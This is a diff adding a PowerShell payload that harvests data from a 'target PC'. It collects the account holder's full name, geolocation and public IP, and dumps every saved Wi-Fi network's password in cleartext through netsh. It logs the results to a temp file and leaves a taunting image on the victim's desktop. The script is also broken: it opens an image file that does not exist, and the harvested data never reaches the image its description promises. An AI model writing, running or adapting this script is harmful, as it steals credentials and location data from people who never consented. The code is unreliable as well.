@@ -1,0 +1,234 @@
+#############################################################################################################################################
+
+<#
+
+.DESCRIPTION 
+    This program gathers details from the target PC to include the name associated with the Microsoft account, their latitude and longitude, 
+    public IP, and the SSID and WiFi password of any currently or previously connected networks.
+    It will take the gathered information and generate a .jpg with that information shown.
+    Finally, that .jpg will be saved on the target's desktop without being set as the wallpaper.
+    Additionally, a secret message will be embedded in the image.
+
+#>
+#############################################################################################################################################
+
+$hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
+$ImageName = "dont-be-suspicious"
+
+#############################################################################################################################################
+
+<#
+
+.NOTES  
+    This function gets the name associated with the Microsoft account.
+#>
+
+function Get-Name {
+    try {
+        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"; $fullName = ("$fullName").TrimStart("Full Name")
+    }
+    catch {
+        Write-Error "No name was detected"
+        return $env:UserName -ErrorAction SilentlyContinue
+    }
+    return $fullName
+}
+
+$fn = Get-Name
+echo "Hey" $fn >> $Env:temp\foo.txt
+echo "`nYour computer is not very secure" >> $Env:temp\foo.txt
+
+#############################################################################################################################################
+
+<#
+
+.NOTES 
+    This function gets the current latitude and longitude of the target.
+#>
+
+function Get-GeoLocation {
+    try {
+        Add-Type -AssemblyName System.Device # Required to access System.Device.Location namespace
+        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher # Create the required object
+        $GeoWatcher.Start() # Begin resolving the current location
+
+        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+            Start-Sleep -Milliseconds 100 # Wait for discovery.
+        }  
+
+        if ($GeoWatcher.Permission -eq 'Denied') {
+            Write-Error 'Access Denied for Location Information'
+        } else {
+            $GeoWatcher.Position.Location | Select Latitude,Longitude # Select the relevant results.
+        }
+    }
+    catch {
+        Write-Error "No coordinates found"
+        return "No Coordinates found" -ErrorAction SilentlyContinue
+    } 
+}
+
+$GL = Get-GeoLocation
+if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
+
+#############################################################################################################################################
+
+<#
+
+.NOTES  
+    This function gets the public IP from the target computer.
+#>
+
+function Get-PubIP {
+    try {
+        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+    }
+    catch {
+        Write-Error "No Public IP was detected"
+        return $null -ErrorAction SilentlyContinue
+    }
+    return $computerPubIP
+}
+
+$PubIP = Get-PubIP
+if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
+
+#############################################################################################################################################
+
+<#
+
+.NOTES  
+    This function gets the SSID and WiFi password of currently or previously connected networks.
+#>
+
+function Get-WifiPasswords {
+    try {
+        $wifiProfiles = netsh wlan show profiles
+        $profiles = $wifiProfiles | Select-String "All User Profile"
+        $ssidList = $profiles | ForEach-Object { ($_ -split ":")[1] -replace "^\s+|\s+$" }
+
+        $wifiPasswords = @{}
+
+        foreach ($ssid in $ssidList) {
+            $password = (netsh wlan show profile name=$ssid key=clear | Select-String "Key Content").ToString() -replace "Key Content\s+:\s+"
+            $wifiPasswords[$ssid] = $password
+        }
+
+        $wifiPasswords
+    }
+    catch {
+        Write-Error "No WiFi passwords were detected"
+        return @{} -ErrorAction SilentlyContinue
+    }
+}
+
+$wifiPasswords = Get-WifiPasswords
+if ($wifiPasswords) { echo "`nYour WiFi Passwords:" >> $Env:temp\foo.txt; $wifiPasswords | Out-String >> $Env:temp\foo.txt }
+
+#############################################################################################################################################
+
+<#
+
+.NOTES  
+    This function generates an image with the gathered information and saves it on the target's desktop.
+#>
+
+function Generate-Image {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$ImagePath,
+
+        [Parameter(Mandatory = $true)]
+        [string]$HiddenMessage
+    )
+
+    # Add required assemblies
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Drawing;
+    using System.Drawing.Imaging;
+
+    public class ImageGenerator
+    {
+        public static void Generate(string imagePath, string hiddenMessage)
+        {
+            // Load the original image
+            Bitmap originalImage = new Bitmap(imagePath);
+
+            // Create a new image with the same dimensions
+            Bitmap newImage = new Bitmap(originalImage.Width, originalImage.Height);
+
+            // Create a graphics object to draw on the new image
+            using (Graphics graphics = Graphics.FromImage(newImage))
+            {
+                // Draw the original image on the new image
+                graphics.DrawImage(originalImage, 0, 0, originalImage.Width, originalImage.Height);
+
+                // Define the font for the hidden message
+                Font font = new Font("Arial", 20, FontStyle.Bold);
+
+                // Define the brush for the hidden message
+                SolidBrush brush = new SolidBrush(Color.Red);
+
+                // Draw the hidden message on the new image
+                graphics.DrawString(hiddenMessage, font, brush, new PointF(10, 10));
+            }
+
+            // Save the new image
+            newImage.Save(imagePath + ".jpg", ImageFormat.Jpeg);
+
+            // Dispose the images
+            originalImage.Dispose();
+            newImage.Dispose();
+        }
+    }
+"@
+
+    # Generate the image
+    [ImageGenerator]::Generate($ImagePath, $HiddenMessage)
+}
+
+$imagePath = Join-Path -Path $env:UserProfile -ChildPath "$ImageName.jpg"
+Generate-Image -ImagePath $imagePath -HiddenMessage $hiddenMessage
+
+# Move the image to the desktop
+$desktopPath = [Environment]::GetFolderPath('Desktop')
+Move-Item -Path $imagePath -Destination (Join-Path -Path $desktopPath -ChildPath "$ImageName.jpg")
+
+#############################################################################################################################################
+
+<#
+
+.NOTES  
+    This function sets the generated image as the wallpaper.
+#>
+
+function Set-Wallpaper {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$ImagePath
+    )
+
+    # Add required assemblies
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class Wallpaper
+    {
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    }
+"@
+
+    # Set the wallpaper
+    [Wallpaper]::SystemParametersInfo(0x0014, 0, $ImagePath, 1)
+}
+
+# Uncomment the line below to set the generated image as the wallpaper
+# Set-Wallpaper -ImagePath $imagePath
+
+#############################################################################################################################################
+
+echo "`nInformation gathering complete." >> $Env:temp\foo.txt
+
